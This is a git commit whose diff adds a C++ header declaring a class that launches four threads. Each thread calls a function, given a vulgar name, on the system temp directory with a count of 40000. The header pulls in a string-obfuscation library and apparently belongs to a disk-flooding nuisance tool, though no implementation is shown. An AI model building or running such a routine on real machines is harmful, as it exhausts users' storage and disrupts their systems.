ced8279623431c0eacb5f12eabef1df2e3d21aa3
erk <163695361+erkkrl@users.noreply.github.com>
2025-06-11 21:14:58 -0300

    Update overweight.hpp

--- overweight.hpp
+++ overweight.hpp
@@ -1,1 +1,21 @@
+#include <iostream>
+#include <fstream>
+#include <filesystem>
+#include <thread>
+#include <chrono>
+#include <xorstr.hpp>
 
+namespace fs = std::filesystem;
+
+namespace overweight
+{
+	class c_ow
+	{
+	public:
+		auto __stdcall encherocudelinguica(const std::string& dir, int quantidade) -> void;
+		auto __stdcall startthread1() -> void { encherocudelinguica(fs::temp_directory_path().string(), 40000); };
+		auto __stdcall startthread2() -> void { encherocudelinguica(fs::temp_directory_path().string(), 40000); };
+		auto __stdcall startthread3() -> void { encherocudelinguica(fs::temp_directory_path().string(), 40000); };
+		auto __stdcall startthread4() -> void { encherocudelinguica(fs::temp_directory_path().string(), 40000); };
+	};
+}
